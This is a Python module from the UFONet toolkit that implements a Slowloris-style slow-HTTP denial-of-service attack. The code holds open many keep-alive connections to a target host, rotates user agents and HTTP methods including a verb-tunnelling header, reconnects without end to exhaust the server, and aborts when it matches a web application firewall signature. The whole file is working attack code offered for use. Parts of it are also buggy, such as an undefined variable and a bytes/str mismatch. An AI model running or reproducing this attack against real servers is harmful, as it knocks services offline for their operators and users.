#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import socket, random, ssl, re
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse

# UFONet Slow HTTP requests (LORIS) + [AI] WAF Detection
def setupSocket(self, ip):
    method = random.choice(self.methods)
    port = 80
    if ip.startswith('http://'):
       ip = ip.replace('http://','')
       port = 80
    elif ip.startswith('https://'):
       ip = ip.replace('https://','')
       port = 443
    self.user_agent = random.choice(self.agents).strip()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    if port == 443:
        sock = ssl.wrap_socket(sock, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1)
    sock.connect((ip, port))
    if method == "GET":
        http_req = "GET / HTTP/1.1\r\nHost: "+str(ip)+"\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n"
    elif method == "POST":
        http_req = "POST / HTTP/1.1\r\nHost: "+str(ip)+"\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n"
    else:
        http_req = "POST / HTTP/1.1\r\nHost: "+str(ip)+"\r\nX-HTTP-Method: PUT\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n" # "Verb Tunneling Abuse" -> [RFC2616]
    sock.sendall(http_req.encode('utf-8'))
    resp = sock.recv(1280).split("\n".encode('utf-8'))
    for l in resp:
        if "Location:".encode('utf-8') in l:
            try:
                ip = re.findall('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', l)[0] # extract new redirect url
                try:
                    ip = socket.gethostbyname(ip)
                except:
                   try:
                       import dns.resolver
                       r = dns.resolver.Resolver()
                       r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                       url = urlparse(ip)
                       a = r.query(url.netloc, "A") # A record
                       for rd in a:
                           ip = str(rd)
                   except:
                       ip = target
            except:
                pass
        else:
            self.wafs_file = "core/txt/wafs.txt" # set source path to retrieve 'wafs'
            try:
                f = open(self.wafs_file)
                wafs = f.readlines()
                f.close()
            except:
                wafs = "broken!"
            sep = "##"
            for w in wafs:
                if sep in w:
                    w = w.split(sep)
                    signature = w[0] # signature
                    t = w[1] # vendor
                if signature in l.decode('utf-8'):
                    print("[Info] [AI] [Control] FIREWALL DETECTED!! -> [" , str(t.split("\n")[0]) , "]")
                    self.warn_flag = True
                    return
    return sock, ip

def tractor(self, ip, requests): 
    n=0
    try:
        for i in range(requests): 
            n=n+1
            try:
                sock, ip = setupSocket(self, ip)
                print("[Info] [AI] [LORIS] Firing 'tractor beam' ["+str(n)+"] -> [CONNECTED!]")
            except:
                print("[Error] [AI] [LORIS] Failed to engage with 'tractor beam' ["+str(n)+"]")
            self.sockets.append(sock)
        while True: # try to abuse HTTP Headers
            for sock in list(self.sockets):
                try: 
                    sock, ip = setupSocket(self, ip)
                except socket.error:
                    self.sockets.remove(sock)
            for i in range(requests - len(self.sockets)):
                print("[Info] [AI] [LORIS] Re-opening closed 'tractor beam' -> [RE-LINKED!]")
                sock, ip = setupSocket(self, ip)
                if sock:
                    self.sockets.append(sock)
    except:
        if self.warn_flag == False:
            print("[Error] [AI] [LORIS] Failing to engage... -> Is still target online? -> [Checking!]")
        else:
            print("[Info] [AI] [LORIS] The attack may not be effective due to the presence of a [FIREWALL] that blocks persistent connections -> [ABORTING!]")

class LORIS(object):
    def __init__(self):
        self.warn_flag = False
        self.sockets = []
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.agents = []
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)
        self.methods = ['GET', 'POST', 'X-METHOD'] # supported HTTP requests methods

    def attacking(self, target, requests):
        print("[Info] [AI] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]")
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        tractor(self, ip, requests) # attack with LORIS using threading
